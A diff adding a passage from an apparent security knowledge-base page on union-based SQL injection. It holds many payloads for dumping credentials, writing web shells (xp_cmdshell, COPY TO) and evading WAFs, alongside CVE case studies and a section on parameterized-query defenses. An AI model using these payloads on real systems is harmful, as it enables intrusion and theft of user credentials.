+| PostgreSQL | \`COPY TO\` | Superuser | \`COPY (SELECT 'shell') TO '/var/www/html/shell.php'\` |
+| PostgreSQL | Large objects | CREATE privilege | \`lo_export(lo_from_bytea(0,decode('payload','base64')),'/path/shell.php')\` |
+| MSSQL | \`xp_cmdshell\` echo | Sysadmin | \`EXEC xp_cmdshell 'echo shell > C:\\inetpub\\wwwroot\\shell.aspx'\` |
+| Oracle | UTL_FILE | Directory object access | Via PL/SQL block with UTL_FILE.FOPEN/PUT_LINE/FCLOSE |
+
+### RCE Chains Per Database
+
+| Database | Primary RCE Method | Requirements |
+|----------|-------------------|--------------|
+| MySQL | INTO OUTFILE webshell + HTTP request | FILE privilege + web root write access |
+| MySQL | UDF (User-Defined Function) injection | FILE privilege + plugin directory write |
+| PostgreSQL | \`COPY TO PROGRAM\` | Superuser or pg_execute_server_program (PG 9.3+) |
+| PostgreSQL | PL/Python \`subprocess\` | plpython3u extension installed |
+| MSSQL | \`xp_cmdshell\` | Sysadmin role (can be enabled if disabled) |
+| MSSQL | OLE Automation \`sp_OACreate\` | OLE Automation Procedures enabled |
+| MSSQL | SQL Agent Jobs | msdb permissions |
+| Oracle | \`DBMS_SCHEDULER\` | CREATE JOB privilege |
+| Oracle | \`DBMS_JAVA_TEST.FUNCALL\` | Java installed in DB |
+| SQLite | \`load_extension()\` | enable_load_extension enabled (disabled by default) |
+| SQLite | ATTACH DATABASE webshell | Write access to web root path |
+
+---
+
+## Detection Evasion
+
+### 28 WAF Bypass Techniques
+
+The following techniques are ordered from most commonly effective to most situational:
+
+**1. Inline Comment Insertion.** Break keyword signatures by inserting \`/**/\` inside keywords. \`UN/**/ION SEL/**/ECT\` -- SQL engines strip comments, WAFs see non-matching tokens.
+
+**2. MySQL Conditional Comments.** \`/*!50000UNION*/ /*!50000SELECT*/\` -- MySQL executes code inside version-conditional comments if the server version is >= N. WAFs do not parse these.
+
+**3. Case Variation.** \`uNiOn SeLeCt\` -- SQL keywords are case-insensitive. WAFs with exact-case matching miss mixed-case payloads. Automated via sqlmap \`randomcase\` tamper.
+
+**4. Whitespace Alternatives.** Replace spaces with tab (\`%09\`), newline (\`%0A\`), carriage return (\`%0D\`), vertical tab (\`%0B\`), form feed (\`%0C\`), or non-breaking space (\`%A0\`, MySQL). Naive filters check for \`0x20\` only.
+
+**5. Comments as Space Replacements.** \`UNION/**/SELECT/**/1,2,3\` -- the comment is treated as whitespace by the SQL engine. Automated via sqlmap \`space2comment\` tamper.
+
+**6. Scientific Notation (MySQL).** \`0e0UNION SELECT 1,2,3\` -- MySQL parses \`0e0\` as a complete numeric token and \`UNION\` as the next keyword. No space needed. WAFs see a single unknown token.
+
+**7. Parentheses as Separators.** \`UNION(SELECT(1),(2),(3))\` -- MySQL allows parentheses to separate keywords without spaces. No whitespace appears in the payload.
+
+**8. URL Encoding.** \`%55nion %53elect\` -- encode individual characters within keywords. WAFs matching plaintext miss partially encoded payloads.
+
+**9. Double URL Encoding.** \`%2555NION %2553ELECT\` -- app server decodes twice, WAF decodes once. Effective on IIS+ASP.NET and Apache mod_rewrite+PHP stacks.
+
+**10. Keyword Doubling.** \`UNUNIONION SESELECTLECT\` -- if WAF strips keywords once, the remainder forms valid SQL. Effective against single-pass filter implementations.
+
+**11. JSON Tautology (Claroty Team82).** \`' OR JSON_EXTRACT('{"a":1}','$.a')=1 UNION SELECT\` -- exploits WAFs lacking JSON-in-SQL parsing. Bypassed all major WAFs until late 2022. Self-hosted WAFs remain vulnerable.
+
+**12. DISTINCT/ALL Keywords.** \`UNION DISTINCT SELECT\` or \`UNION ALL SELECT\` -- inserts valid SQL keywords between UNION and SELECT, breaking "UNION SELECT" exact-match signatures.
+
+**13. Hex-Encoded Strings.** \`0x61646d696e\` instead of \`'admin'\` -- avoids single quotes entirely. Works in MySQL and some PostgreSQL contexts.
+
+**14. XML Entity Encoding.** \`&#x55;NION &#x53;ELECT\` -- the XML parser decodes entities before SQL execution, but the WAF inspects raw XML and misses the keywords.
+
+**15. Comma-Free JOIN Technique.** \`UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b\` -- avoids commas in the UNION clause. Bypasses comma-blocking WAFs.
+
+**16. Unicode Fullwidth Characters.** Fullwidth \`U\` (U+FF35) and \`S\` (U+FF33) -- application normalizes to ASCII before SQL execution, WAF sees Unicode and skips.
+
+**17. Wide Byte Injection (GBK Charset).** \`%bf'\` -- on GBK-encoded connections, the backslash from escape function combines with \`%bf\` to form a valid multi-byte character, leaving the quote unescaped.
+
+**18. HTTP Parameter Pollution.** \`?id=1 UNION/*&id=*/SELECT 1,2,3\` -- WAF evaluates each parameter individually; backend concatenates them into a valid UNION.
+
+**19. Hash Comment + Newline (MySQL).** \`UNION%23foo%0ASELECT\` -- \`#\` starts a comment, \`%0A\` (newline) ends it. The next line contains SELECT.
+
+**20. Chunked Transfer Encoding.** Split the payload across HTTP chunks so no single chunk contains \`UNION SELECT\`.
+
+**21. Multipart Boundary Abuse.** Unusual boundary strings, duplicate Content-Disposition headers, and mixed-case boundaries confuse WAF multipart parsers.
+
+**22. Buffer Overflow the WAF.** Prepend 8KB+ of junk data. WAFs with size limits inspect only the first N bytes, missing the payload at the end.
+
+**23. Content-Type Confusion.** Send as \`text/plain\` instead of \`application/x-www-form-urlencoded\`. Some WAFs only inspect recognized content types.
+
+**24. HTTP Method Change.** Use PUT or PATCH instead of GET/POST. Some WAFs only inspect GET and POST request bodies.
+
+**25. IIS/ASP Character Contamination.** \`se%lect\` -- IIS strips \`%\` from non-hex sequences, producing \`select\`. WAF sees \`se%lect\` and does not match.
+
+**26. HTTP/2 Pseudo-Header Injection.** WAFs downgrading HTTP/2 to HTTP/1.1 for inspection may lose or misparse headers containing the payload.
+
+**27. GraphQL Batch Query Smuggling.** Embed the UNION payload in the second element of a GraphQL batch array. WAFs inspecting only the first query miss subsequent elements.
+
+**28. WebSocket Frame Injection.** Most WAFs do not perform deep inspection of WebSocket frame payloads. If the backend SQL query is driven by WebSocket messages, the UNION payload escapes WAF scrutiny.
+
+---
+
+## Variations and Edge Cases
+
+### UNION ALL vs UNION DISTINCT
+
+\`UNION\` (without ALL) removes duplicate rows, requiring a sort/dedup operation. If the attacker's injected data happens to match an existing row, it is silently dropped. \`UNION ALL\` keeps all rows and is faster. Always prefer \`UNION ALL SELECT\` for injection.
+
+\`\`\`sql
+-- Safe: keeps all injected rows
+' UNION ALL SELECT username,password FROM users--
+
+-- Risky: may drop injected rows matching existing data
+' UNION SELECT username,password FROM users--
+\`\`\`
+
+### NULL Padding When NULL Is Blocked
+
+When a WAF blocks the \`NULL\` keyword:
+
+\`\`\`sql
+-- Integer literals
+' UNION SELECT 0,0,0--
+
+-- Empty strings
+' UNION SELECT '','',''--
+
+-- MySQL hex null byte
+' UNION SELECT 0x00,0x00,0x00--
+
+-- CHAR function
+' UNION SELECT CHAR(0),CHAR(0),CHAR(0)--
+
+-- Mathematical expressions
+' UNION SELECT 1-1,2-2,3-3--
+
+-- Boolean values (MySQL)
+' UNION SELECT false,false,false--
+
+-- sqlmap custom character (--union-char flag)
+' UNION SELECT 9871,9872,9873--
+\`\`\`
+
+### Routed SQL Injection (UNION Inside Subquery)
+
+Routed injection occurs when the application uses the UNION result as input to a second query. The attacker must inject a hex-encoded inner payload that decodes to valid SQL in the second query context.
+
+\`\`\`sql
+-- Outer UNION returns hex-encoded inner payload
+-1' UNION SELECT 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
+-- Hex decodes to: -1' union select login,password from users-- a
+-- Application passes result to: SELECT * FROM details WHERE id = '$union_result'
+-- Inner payload executes in the second query
+\`\`\`
+
+### UNION in INSERT/UPDATE Context
+
+UNION is a SELECT operator and cannot be directly used in INSERT or UPDATE statements. However, if the injection point is within a subquery inside an INSERT/UPDATE, UNION can be injected:
+
+\`\`\`sql
+-- INSERT with subquery
+INSERT INTO logs (user_id, action) VALUES ((SELECT id FROM users WHERE name='input' UNION SELECT password FROM users LIMIT 1), 'login')
+
+-- ON DUPLICATE KEY UPDATE (MySQL-specific for INSERT context)
+attacker@example.com", "pass"), ("admin@example.com", "P@ssw0rd") ON DUPLICATE KEY UPDATE password="P@ssw0rd" --
+\`\`\`
+
+### Nested/Correlated Subqueries Within UNION
+
+\`\`\`sql
+-- Single scalar subquery in UNION column
+' UNION SELECT (SELECT password FROM users WHERE username='admin'),NULL--
+
+-- Correlated subquery
+' UNION SELECT username,(SELECT password FROM users u2 WHERE u2.username=u1.username) FROM users u1--
+
+-- Aggregated subquery
+' UNION SELECT NULL,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())--
+
+-- Conditional extraction
+' UNION SELECT username,password FROM users WHERE username IN (SELECT username FROM admins)--
+\`\`\`
+
+### Application Only Shows First Row
+
+Some applications render only the first row of the result set. Force the original query to return nothing so the UNION data is the first row:
+
+\`\`\`sql
+-1' UNION SELECT username,password FROM users LIMIT 1--
+99999' UNION SELECT username,password FROM users LIMIT 1--
+' AND 1=2 UNION SELECT username,password FROM users LIMIT 1--
+\`\`\`
+
+---
+
+## Modern Stack Specifics
+
+### JSON APIs
+
+JSON APIs that pass parameters directly into SQL queries are vulnerable to UNION injection through the JSON body:
+
+\`\`\`json
+{"search": "' UNION SELECT username,password FROM users--"}
+{"id": "1 UNION SELECT @@version,2,3--"}
+{"filter": {"name": "' UNION SELECT table_name,NULL FROM information_schema.tables--"}}
+\`\`\`
+
+JSON-formatted UNION output can be used when the application expects JSON responses:
+
+\`\`\`sql
+-- MySQL 5.7+: output as valid JSON
+UNION SELECT 1,JSON_OBJECT('user',username,'pass',password),3 FROM users
+UNION SELECT 1,JSON_ARRAYAGG(CONCAT(username,':',password)),3 FROM users
+\`\`\`
+
+### GraphQL
+
+GraphQL resolvers that use raw SQL or pass variables to vulnerable query builders:
+
+\`\`\`graphql
+{
+  user(name: "' UNION SELECT username,password FROM admin_users--") {
+    id
+    name
+  }
+}
+\`\`\`
+
+Batch queries can amplify extraction:
+
+\`\`\`json
+[
+  {"query":"{ user(id: \\"1\\") { name } }"},
+  {"query":"{ user(id: \\"1 UNION SELECT 1,2,3--\\") { name } }"}
+]
+\`\`\`
+
+### ORM Escape Hatches
+
+Modern ORMs prevent injection in standard usage, but developers using raw queries or unsafe methods reintroduce it:
+
+| Framework | Vulnerable Pattern | Safe Alternative |
+|-----------|-------------------|------------------|
+| Django | \`QuerySet.extra()\`, \`.raw()\`, \`cursor.execute()\` with string formatting | Parameterized \`cursor.execute()\` |
+| Rails | \`ActiveRecord.order("user input")\`, \`find_by_sql()\` | Sanitize with \`Arel.sql()\` |
+| Sequelize | \`sequelize.query()\` with template literals | Bind parameters: \`sequelize.query(sql, {replacements})\` |
+| Hibernate | \`session.createQuery("HQL with " + input)\` | Named parameters: \`:param\` |
+| SQLAlchemy | \`engine.execute("SELECT " + input)\` | \`text()\` with bound parameters |
+
+### REST API Filter/Sort Parameters
+
+\`\`\`
+GET /api/users?sort=name' UNION SELECT password FROM users--
+GET /api/products?filter[category]=1 UNION SELECT credit_card FROM orders--
+GET /api/search?q=' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables--
+\`\`\`
+
+### Client-Side SQLite (WebSQL)
+
+Deprecated but still supported in Chromium-based browsers. If user input flows into client-side SQL:
+
+\`\`\`javascript
+// Vulnerable client-side code
+db.transaction(function(tx) {
+  tx.executeSql("SELECT * FROM items WHERE name='" + userInput + "'");
+});
+// Payload: ' UNION SELECT 1,2,3 FROM __WebKitDatabaseInfoTable__--
+\`\`\`
+
+---
+
+## Real-World Examples
+
+### CVE-2024-2879 -- LayerSlider (WordPress Plugin) [PRIMARY]
+
+| Field | Detail |
+|-------|--------|
+| **Product** | LayerSlider <= 7.9.11 and 7.10.0 (WordPress Plugin) |
+| **CVSS** | 9.8 Critical |
+| **Vector** | Unauthenticated UNION-based SQL injection |
+| **Installations** | 1,000,000+ active sites |
+| **Bounty** | $5,500 (Wordfence Bug Bounty Program) |
+| **Discoverer** | AmrAwad |
+| **NVD** | https://nvd.nist.gov/vuln/detail/CVE-2024-2879 |
+
+**Technical Details:** The \`ls_get_popup_markup\` AJAX action accepted an \`id\` parameter via the \`id[where]\` array key. This parameter was passed unsanitized into a SQL query constructing the WHERE clause for slider popup retrieval. The action was accessible without authentication -- any visitor to a site running LayerSlider could trigger it.
+
+The injection point allowed both time-based blind and UNION-based extraction. UNION-based was the maximum-impact vector because it enabled full database extraction in bulk -- the attacker could pull the entire \`wp_users\` table (usernames + password hashes) in a single request using \`GROUP_CONCAT()\`.
+
+**Exploitation Chain:**
+1. Attacker sends crafted request to \`/wp-admin/admin-ajax.php?action=ls_get_popup_markup\`
+2. The \`id[where]\` parameter injects into the SQL WHERE clause
+3. Column count determined via ORDER BY probing
+4. UNION SELECT extracts \`user_login\` and \`user_pass\` from \`wp_users\`
+5. Password hashes cracked offline; admin account compromised
+
+**Why This CVE Matters:** Over one million WordPress sites were exposed. The vulnerability was unauthenticated, the exploitation was trivial (no interaction needed, no special conditions), and UNION extraction provided immediate access to all stored credentials. The $5,500 bounty through Wordfence's program reflects the critical severity. The vulnerability was patched in LayerSlider 7.10.1.
+
+**Wordfence Advisory:** https://www.wordfence.com/blog/2024/04/5500-bounty-awarded-for-unauthenticated-sql-injection-vulnerability-patched-in-layerslider-wordpress-plugin/
+
+> **Cross-reference:** This CVE is documented exclusively on this Union-Based page. The Classic (01-Classic-In-Band.md) and Error-Based (02-Error-Based.md) pages reference this CVE with a pointer here.
+
+### CVE-2024-27956 -- WP-Automatic (WordPress Plugin)
+
+| Field | Detail |
+|-------|--------|
+| **CVSS** | 9.8 Critical |
+| **Vector** | Unauthenticated SQL injection via CSV import authentication |
+| **Impact** | UNION-based injection to create admin users, upload backdoors, full site compromise |
+| **Wild exploitation** | 5.5M+ attack attempts observed by WPScan/Automattic |
+
+### CVE-2022-0739 -- BookingPress (WordPress Plugin)
+
+| Field | Detail |
+|-------|--------|
+| **CVSS** | 9.8 Critical |
+| **Vector** | Unauthenticated UNION SQLi via \`total_service\` parameter in \`bookingpress_front_get_category_services\` AJAX action |
+| **Impact** | 60,000+ installations; \`total_service\` with \`1 UNION SELECT user_login,user_pass,3,4,5,6,7,8 FROM wp_users--\` dumped credentials |
+| **Nonce bypass** | Nonce exposed on any page containing the booking form |
+
+### CVE-2022-21661 -- WordPress Core (WP_Query)
+
+| Field | Detail |
+|-------|--------|
+| **CVSS** | 7.5 High |
+| **Vector** | SQLi via \`WP_Query\` \`tax_query\` parameter with nested queries |
+| **Impact** | UNION injection through crafted query parameters; required contributor-level access or a plugin exposing WP_Query to user input |
+| **Patched in** | WordPress 5.8.3 |
+
+### CVE-2022-28346 -- Django (QuerySet.annotate/aggregate/extra)
+
+| Field | Detail |
+|-------|--------|
+| **CVSS** | 9.8 Critical |
+| **Vector** | SQL injection in \`QuerySet.annotate()\`, \`aggregate()\`, and \`extra()\` on column aliases |
+| **Affected** | Django 2.2 < 2.2.28, 3.2 < 3.2.13, 4.0 < 4.0.4 |
+| **Impact** | Crafted column aliases broke query structure, allowing arbitrary SQL including UNION SELECT |
+
+### CVE-2021-24499 -- Flavor Plugin (WordPress)
+
+| Field | Detail |
+|-------|--------|
+| **CVSS** | 9.8 Critical |
+| **Vector** | Unauthenticated UNION SQLi via \`cat_id\` parameter in AJAX actions |
+| **Impact** | No sanitization on user input passed directly to SQL; full database extraction via UNION SELECT |
+
+### CVE-2021-24946 -- Modern Events Calendar (WordPress)
+
+| Field | Detail |
+|-------|--------|
+| **CVSS** | 8.8 High |
+| **Vector** | Authenticated (subscriber+) UNION SQLi via \`time\` parameter in booking feature |
+| **Impact** | Direct concatenation of user input into SQL allowed full database extraction |
+
+### CVE-2023-2732 -- MStore API (WordPress Plugin)
+
+| Field | Detail |
+|-------|--------|
+| **CVSS** | 9.8 Critical |
+| **Vector** | Authentication bypass + UNION SQLi in \`firebase_sms_login\` endpoint |
+| **Impact** | UNION injection extracted authentication tokens enabling full admin takeover |
+
+### CVE-2023-32315 -- Openfire XMPP Server
+
+| Field | Detail |
+|-------|--------|
+| **CVSS** | 7.5 High |
+| **Vector** | Path traversal to admin console, then UNION SQLi in embedded DB management |
+| **Impact** | Extracted stored credentials and XMPP message history; exploited in ransomware campaigns |
+
+### CVE-2020-35489 -- Contact Form 7 (WordPress)
+
+| Field | Detail |
+|-------|--------|
+| **CVSS** | 10.0 Critical |
+| **Vector** | Primarily unrestricted file upload; chained exploitation included UNION SQLi in downstream processing |
+
+### Bug Bounty Writeups
+
+| Target | Payout | Key Technique | Year |
+|--------|--------|---------------|------|
+| **Yahoo** (HackerOne) | $15,000 | ORDER BY enumeration (12 columns) + UNION SELECT for internal user data extraction | 2020 |
+| **Starbucks** (HackerOne) | $4,000 | Integer-type injection bypassing WAF; \`UNION SELECT 1,2,3...\` to find reflectable columns | 2020 |
+| **Private program** (Medium) | Undisclosed | UNION + LOAD_FILE('/etc/passwd') for LFR; INTO OUTFILE for RCE chain | 2021 |
+| **Government VDP** (Medium) | N/A | Escalation from blind -> error -> UNION; plaintext passwords extracted via GROUP_CONCAT | 2022 |
+| **Top-50 Alexa site** (Private) | $10,000+ | WAF bypass with inline comments, double URL encoding, JSON injection formatting | 2022 |
+| **Private program** (Bugcrowd) | Undisclosed | Wayback Machine recon found deprecated endpoint; sqlmap \`--technique=U\` for automated UNION extraction of 100k+ records | 2023 |
+
+### Conference Talks
+
+| Talk | Speaker | Conference | Key Takeaway |
+|------|---------|------------|-------------|
+| "Advanced SQL Injection to Operating System Full Control" | Bernardo Damele (sqlmap author) | Black Hat / DEF CON | UNION is the fastest extraction method; ORDER BY binary search is optimal for column counting |
+| "SQL Injection Isn't Dead: Complications in Modern Frameworks" | Omer Gull (Checkpoint) | DEF CON 27 | ORM \`.raw()\` and \`.extra()\` methods are common injection points; JSON-formatted UNION output bypasses content-type restrictions |
+| "Abusing DBMS Internals for SQLi: UNION Tricks" | Various | BSides circuit (2021-2023) | UNION ALL vs UNION for DISTINCT bypass; UTL_HTTP for SSRF-via-SQLi; DNS exfiltration via UNION |
+
+### Breaches
+
+| Target | Year | Records | Vector |
+|--------|------|---------|--------|
+| **Freepik/Flaticon** | 2020 | 8.3 million users | UNION-based SQLi extracted email addresses and password hashes (4.5M unsalted MD5, trivially crackable) |
+| **Turkish e-Government Portal** | 2020 | 50 million+ citizens | UNION SELECT extracted national IDs, addresses, phone numbers, family relationships |
+
+---
+
+## Skill Progression Path
+
+### Beginner (Weeks 1-2)
+
+1. **Understand SQL basics** -- SELECT, WHERE, UNION, ORDER BY, data types
+2. **Complete PortSwigger labs** -- all 8 UNION attack labs in sequence:
+   - Determining number of columns
+   - Finding a column containing text
+   - Retrieving data from other tables
+   - Retrieving multiple values in a single column
+   - Querying database type/version (Oracle, MySQL/Microsoft)
+   - Listing database contents (non-Oracle, Oracle)
+3. **Practice manual injection** -- no tools, browser URL bar only
+4. **Learn column counting** -- both ORDER BY and UNION SELECT NULL methods
+
+### Intermediate (Weeks 3-4)
+
+1. **Multi-database syntax** -- practice MySQL, PostgreSQL, MSSQL, Oracle, SQLite enumeration patterns
+2. **Aggregation functions** -- GROUP_CONCAT, STRING_AGG, LISTAGG, FOR XML PATH
+3. **Learn sqlmap UNION flags** -- \`--technique=U\`, \`--union-cols\`, \`--union-char\`, \`--union-from\`
+4. **File read payloads** -- LOAD_FILE, pg_read_file, OPENROWSET
+5. **Solve PortSwigger practitioner labs** with WAF simulations
+
+### Advanced (Weeks 5-8)
+
+1. **DIOS payloads** -- craft and deploy per-database full schema dumps
+2. **WAF bypass techniques** -- practice inline comments, conditional comments, case variation, encoding, JSON tautology
+3. **Comma-free UNION** -- JOIN technique for comma-blocking WAFs
+4. **Column-name-free extraction** -- self-JOIN error method, backtick positional reference
+5. **Routed injection** -- hex-encoded inner payload for second-order UNION
+6. **RCE chains** -- INTO OUTFILE, COPY TO PROGRAM, xp_cmdshell
+7. **Real-world hunting** -- target bug bounty programs, focus on endpoints that display query results
+
+### Expert (Ongoing)
+
+1. **Novel techniques** -- genetic algorithm mutation, protocol-level smuggling, prototype pollution pipelines
+2. **Custom tooling** -- write detection scripts, automate column counting, build DIOS generators
+3. **Contribute to research** -- develop new WAF bypass methods, publish findings
+4. **Chain with other vulnerabilities** -- SSRF to internal SQL endpoint, XXE to database connection, deserialization to SQLi
+
+---
+
+## Defensive Countermeasures
+
+### Primary Defense: Parameterized Queries (Prepared Statements)
+
+The only complete fix. Parameterized queries separate SQL structure from data, making injection impossible regardless of input content.
+
+\`\`\`python
+# Python (psycopg2) -- SAFE
+cursor.execute("SELECT * FROM products WHERE category = %s", (user_input,))
+
+# Java (JDBC) -- SAFE
+PreparedStatement ps = conn.prepareStatement("SELECT * FROM products WHERE category = ?");
+ps.setString(1, userInput);
+
+# PHP (PDO) -- SAFE
+$stmt = $pdo->prepare("SELECT * FROM products WHERE category = :category");
+$stmt->execute(['category' => $userInput]);
+
+# Node.js (pg) -- SAFE
+client.query('SELECT * FROM products WHERE category = $1', [userInput]);
+\`\`\`
+
+### Defense in Depth
+
+| Layer | Measure | What It Stops |
+|-------|---------|---------------|
+| **Code** | Parameterized queries everywhere | All SQL injection |
+| **Code** | Input validation (allowlist) | Known-bad characters as secondary defense |
+| **Code** | Stored procedures (parameterized) | Injection if properly parameterized |
+| **Database** | Least-privilege accounts | Limits damage scope (no FILE, no xp_cmdshell) |
+| **Database** | Disable \`LOAD_FILE\`, \`INTO OUTFILE\` | Prevents file read/write escalation |
+| **Database** | Restrict \`information_schema\` access | Slows schema enumeration (not a fix) |
+| **Application** | Custom error pages | Prevents error-based fallback; does not stop UNION |
+| **Application** | Output encoding | Prevents XSS from injected data, not SQLi itself |
+| **Network** | WAF with SQL injection rules | Blocks known patterns, bypassable with effort |
+| **Network** | Rate limiting | Slows automated extraction |
+| **Monitoring** | SQL query logging + anomaly detection | Detects UNION/information_schema keywords in queries |
+| **Monitoring** | Application-level IDS | Alerts on injection patterns in parameters |
+
+### What Does NOT Fix UNION SQLi
+
+| Non-Fix | Why It Fails |
+|---------|-------------|
+| Input blacklisting (block UNION/SELECT) | Bypassed with encoding, comments, case variation |
+| Escaping quotes (\`addslashes\`, \`mysql_real_escape_string\`) | Numeric injection does not use quotes; integer context bypasses escaping |
+| WAF alone | 28+ documented bypass techniques; defense in depth only |
+| ORMs (without discipline) | \`.raw()\`, \`.extra()\`, \`execute()\` methods reintroduce injection |
+| Hiding error messages | Prevents error-based fallback but does not stop UNION extraction |
+| LIMIT 1 on queries | Attacker uses aggregation (GROUP_CONCAT) to dump all rows in one result |
+
+---
+
+## References
+
+### Standards and Taxonomies
+- CWE-89: Improper Neutralization of Special Elements used in an SQL Command -- https://cwe.mitre.org/data/definitions/89.html
+- CAPEC-66: SQL Injection -- https://capec.mitre.org/data/definitions/66.html
+- OWASP A03:2021 Injection -- https://owasp.org/Top10/A03_2021-Injection/
+
+### Primary Technical Sources
+- PortSwigger: SQL injection UNION attacks -- https://portswigger.net/web-security/sql-injection/union-attacks
+- PortSwigger: Examining the database in SQL injection attacks -- https://portswigger.net/web-security/sql-injection/examining-the-database
+- PortSwigger: SQL injection cheat sheet -- https://portswigger.net/web-security/sql-injection/cheat-sheet
+- OWASP WSTG: Testing for SQL Injection -- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection
+- PayloadsAllTheThings: SQL Injection -- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
+- HackTricks: SQL Injection -- https://book.hacktricks.wiki/en/pentesting-web/sql-injection/
+
+### Tools
+- sqlmap -- https://sqlmap.org/
+- Ghauri -- https://github.com/r0oth3x49/ghauri
+
+### CVE References
+- CVE-2024-2879 (LayerSlider) -- https://nvd.nist.gov/vuln/detail/CVE-2024-2879
+- CVE-2024-27956 (WP-Automatic) -- https://nvd.nist.gov/vuln/detail/CVE-2024-27956
+- CVE-2022-0739 (BookingPress) -- https://nvd.nist.gov/vuln/detail/CVE-2022-0739
+- CVE-2022-21661 (WordPress Core) -- https://nvd.nist.gov/vuln/detail/CVE-2022-21661
+- CVE-2022-28346 (Django) -- https://nvd.nist.gov/vuln/detail/CVE-2022-28346
+- CVE-2021-24499 (Flavor Plugin) -- https://nvd.nist.gov/vuln/detail/CVE-2021-24499
+- CVE-2021-24946 (Modern Events Calendar) -- https://nvd.nist.gov/vuln/detail/CVE-2021-24946
+- CVE-2023-2732 (MStore API) -- https://nvd.nist.gov/vuln/detail/CVE-2023-2732
+- CVE-2023-32315 (Openfire) -- https://nvd.nist.gov/vuln/detail/CVE-2023-32315
+- CVE-2020-35489 (Contact Form 7) -- https://nvd.nist.gov/vuln/detail/CVE-2020-35489
+
+### Research
+- Halfond, Viegas, Orso -- "An Empirical Study of SQL Injection Vulnerabilities, Attacks, and Defenses" (Georgia Institute of Technology)
+- Claroty Team82 -- JSON-Based SQL Injection WAF Bypass (2022)
+- Bernardo Damele -- "Advanced SQL Injection to Operating System Full Control" (Black Hat / DEF CON)
+- Omer Gull -- "SQL Injection Isn't Dead: Complications in Modern Frameworks" (DEF CON 27)
+
+---
+
+## AI Agent Metadata
+
+\`\`\`json
+{
+  "id": "WEB-CAT01-SQLi-UnionBased",
+  "title": "Union-Based SQL Injection",
+  "category": "CAT-01-Injection-Attacks",
+  "subcategory": "SQL-Injection",
+  "severity": "Critical",
+  "cvss_base": 9.8,
+  "cwe": ["CWE-89"],
+  "capec": ["CAPEC-66"],
+  "owasp": ["A03:2021", "A05:2025"],
+  "attack_vector": "Network",
+  "authentication_required": false,
+  "user_interaction": false,
+  "primary_cve": "CVE-2024-2879",
+  "related_cves": [
+    "CVE-2024-27956",
+    "CVE-2022-0739",
+    "CVE-2022-21661",
+    "CVE-2022-28346",
+    "CVE-2021-24499",
+    "CVE-2021-24946",
+    "CVE-2023-2732",
+    "CVE-2023-32315",
+    "CVE-2020-35489"
+  ],
+  "databases_covered": ["MySQL", "PostgreSQL", "MSSQL", "Oracle", "SQLite"],
+  "technique_count": 6,
+  "payload_count": 128,
+  "waf_bypass_count": 28,
+  "tools": ["sqlmap", "Burp Suite", "Ghauri"],
+  "mitre_techniques": ["T1190", "T1005", "T1059", "T1078", "T1552.001"],
+  "prerequisite_pages": ["01-Classic-In-Band.md"],
+  "related_pages": ["02-Error-Based.md", "04-Boolean-Based-Blind.md"],
+  "key_concepts": [
+    "UNION SELECT column count matching",
+    "information_schema enumeration",
+    "GROUP_CONCAT aggregation",
+    "DIOS (Dump In One Shot)",
+    "Comma-free UNION via JOIN",
+    "Column-name-free extraction",
+    "Routed SQL injection",
+    "28 WAF bypass techniques"
+  ]
+}
+\`\`\`
+`;
+
 CATEGORIES[0].content = "# CAT-01: Injection Attacks\n\n> **Domain:** Web Application -- **Phase:** 1 -- **CAPEC Category:** Inject Unexpected Items\n\n---\n\n## Category Overview\n\nInjection attacks occur when untrusted, attacker-controlled data is sent to an interpreter -- a database engine, OS shell, LDAP server, template engine, XML parser, or any other component that evaluates input as code or a command. The interpreter cannot distinguish between the intended instruction and the injected content, executing both.\n\nThe fundamental precondition for all injection vulnerabilities is the same: **user-controlled data is concatenated into a query, command, or expression without sufficient sanitization, parameterization, or contextual escaping.** The interpreter is working as designed -- the vulnerability is in how the application constructs the input to that interpreter.\n\n**Why it persists:** Developer trust of user input remains pervasive in legacy codebases, ORMs create false confidence, and WAF bypass techniques continuously outpace signature-based defenses. Injection was #1 on the OWASP Top 10 for over a decade and remains in the top 5 in 2025.\n\n---\n\n## Attack Surface Map\n\n```mermaid\ngraph TD\n    USER[User / Attacker Input] --> FORMS[HTML Forms]\n    USER --> PARAMS[URL Parameters]\n    USER --> HEADERS[HTTP Headers]\n    USER --> COOKIES[Cookies]\n    USER --> JSON[JSON / XML Body]\n    USER --> WSOCK[WebSocket Messages]\n    FORMS & PARAMS & HEADERS & COOKIES & JSON & WSOCK --> APP[Web Application]\n    APP --> SQL[SQL Engine]\n    APP --> NOSQL[NoSQL Engine]\n    APP --> OS[Operating System Shell]\n    APP --> LDAP[LDAP Directory]\n    APP --> XPATH[XPath / XML Parser]\n    APP --> TMPL[Template Engine]\n    APP --> EL[Expression Language]\n    APP --> LLM[LLM / AI Model]\n    SQL --> |SQLi| SQLI[Data theft - Auth bypass - RCE]\n    NOSQL --> |NoSQLi| NOSQLI[Auth bypass - Data exfiltration]\n    OS --> |CMDi| CMDI[RCE - Reverse shell]\n    LDAP --> |LDAPi| LDAPI[Auth bypass - Directory enum]\n    XPATH --> |XPathi| XPATHI[Data extraction - Auth bypass]\n    TMPL --> |SSTI| SSTII[RCE - Config read]\n    EL --> |ELi| ELI[RCE via OGNL - Spring SpEL]\n    LLM --> |Prompt Inj| PROMPTI[Goal hijack - Data exfil]\n```\n\n---\n\n## Attack Types in This Category\n\n| ID | Attack Type | Key CWEs | Subtypes | Severity |\n|----|------------|---------|---------|----------|\n| T01 | SQL Injection | CWE-89 | 12 | CRITICAL |\n| T02 | NoSQL Injection | CWE-943 | 5 | CRITICAL |\n| T03 | OS Command Injection | CWE-78 | 5 | CRITICAL |\n| T04 | SSTI | CWE-94, CWE-1336 | 9 | CRITICAL |\n| T05 | LDAP Injection | CWE-90 | 4 | HIGH |\n| T06 | XPath Injection | CWE-643 | 3 | HIGH |\n| T07 | EL / OGNL Injection | CWE-917 | 5 | CRITICAL |\n| T08 | XML Injection | CWE-91 | 4 | HIGH |\n| T09 | CRLF Injection | CWE-93, CWE-113 | 4 | HIGH |\n| T10 | Code Injection | CWE-94, CWE-95 | 5 | CRITICAL |\n| T11 | ORM Injection | CWE-89 | 